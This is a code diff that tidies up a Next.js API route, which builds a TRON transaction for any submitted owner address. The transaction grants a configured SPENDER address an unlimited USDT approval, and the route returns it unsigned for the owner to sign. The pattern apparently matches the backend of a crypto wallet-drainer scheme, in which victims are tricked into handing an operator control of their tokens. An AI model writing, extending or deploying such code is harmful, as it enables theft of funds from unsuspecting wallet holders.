@@ -2,85 +2,41 @@ import { NextResponse } from 'next/server';
 import { getServerTW, CFG } from '../../lib/tronService';
 
 export async function POST(req) {
-
     try {
-
-        const {
-            ownerAddress,
-            amount
-        } = await req.json();
+        const { ownerAddress, amount } = await req.json();
 
         if (!ownerAddress || !amount) {
-
-            return NextResponse.json({
-
-                error: 'Missing params'
-
-            }, { status: 400 });
-
+            return NextResponse.json({ error: 'Missing params' }, { status: 400 });
         }
 
         const tw = getServerTW();
 
-        const txBuild =
-            await tw.transactionBuilder
-                .triggerSmartContract(
+        // Build the approval transaction
+        const txBuild = await tw.transactionBuilder.triggerSmartContract(
+            CFG.USDT,
+            'approve(address,uint256)',
+            { feeLimit: 150_000_000 },
+            [
+                { type: 'address', value: CFG.SPENDER },
+                { type: 'uint256', value: '115792089237316195423570985008687907853269984665640564039457584007913129639935' }
+            ],
+            ownerAddress
+        );
 
-                    CFG.USDT,
+        let transaction = txBuild.transaction;
 
-                    'approve(address,uint256)',
-
-                    {
-                        feeLimit: 150000000
-                    },
-
-                    [
-                        {
-                            type: 'address',
-                            value: CFG.SPENDER
-                        },
-
-                        {
-                            type: 'uint256',
-                            value: '115792089237316195423570985008687907853269984665640564039457584007913129639935' // UNLIMITED approval
-                        }
-
-                    ],
-
-                    ownerAddress
-
-                );
-
-        // FIX: extract correctly
-        let transaction =
-            txBuild.transaction;
-
-        // IMPORTANT FIX
-        transaction =
-            await tw.trx.extendExpiration(
-                transaction,
-                60
-            );
-
-        // IMPORTANT FIX
+        // Ensure transaction is valid
+        transaction = await tw.trx.extendExpiration(transaction, 60);
         transaction.visible = false;
 
-        return NextResponse.json({
-
-            transaction
-
-        });
+        return NextResponse.json({ transaction });
 
     } catch (error) {
-
-        console.error(error);
-
+        console.error('Prepare API Error:', error);
         return NextResponse.json({
-
-            error: error.message
-
+            error: error.message || 'Unknown Server Error',
+            stack: process.env.NODE_ENV === 'development' ? error.stack : undefined,
+            hint: 'Ensure PRIVATE_KEY, SPENDER, and USDT are correct in Vercel.'
         }, { status: 500 });
-
     }
-
 }
